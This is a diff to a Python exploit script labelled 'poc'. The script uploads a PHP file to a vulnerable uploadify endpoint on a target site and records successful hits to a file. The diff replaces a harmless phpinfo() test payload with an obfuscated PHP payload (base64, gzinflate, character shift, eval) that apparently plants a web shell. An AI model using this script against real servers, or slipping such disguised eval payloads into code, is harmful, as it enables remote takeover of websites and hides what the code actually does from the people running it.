@@ -22,14 +22,14 @@ def poc(target):
     }
     filename = calculate_md5(target) + ".php"
     files = {
-        ("Filedata", (filename, '''<?php phpinfo(); ?>''', "application/octet-stream")),
+        ("Filedata", (filename, '''<?php function VcegE($ZPWpB) { $ZPWpB=gzinflate(base64_decode($ZPWpB)); for($i=0;$i<strlen($ZPWpB);$i++) { $ZPWpB[$i] = chr(ord($ZPWpB[$i])-1); } return $ZPWpB; }eval(VcegE("lVBNT8JAEP0tHEi2TYTu7CeNqUYlXIwSAT/w0rTbLSoEklJj/z2zFFJCubiXybydee/N63Tc675m01VkCpuUNs5/16b83qy9bVnExaYE7pEu8fsnbY5tmmytEnFmzSazHkn/ougC+rJHT1YL4l+dDX3WQ+ar8GjFKfRoxQbpEUisMAGtwJg2+12zCMB0jwKV+gAIoRQNEAFRI1yzHnPf/3Fee8gT9BTKQ6s4k4DMjEJrbbwn86/3iXrnn7N59Uz6ZLZgY4r1fpUtR1i3jw+THCs5yEEYoh4I0aKfNK44SDxn0Bp5Ow2Fa4zBhaDRKmkkQFOGaUktjicCN6hp2nx2cSmeeWNESTagQahorTBS2XuJFT6mS4316Wch3NFDA+OhOzZyNjCi25sd"));?>''', "application/octet-stream")),
         ("file", ("", "", "application/octet-stream"))
     }
     print(f"[*]Now try: {target}")
     try:
         response = requests.post(target + "/inc/jquery/uploadify/uploadify.php", headers=headers, files=files, allow_redirects=False, timeout=5)
         if response.text.isdigit() == True and response.status_code == 200:
-            file_url = target + "/attachment/" + response.text + filename
+            file_url = f"{target}/attachment/{response.text}/{filename}"
             print(f"[+]Succeeded: {file_url}")
             f = open('hit.txt', 'a+')
             f.write(file_url + "\n")
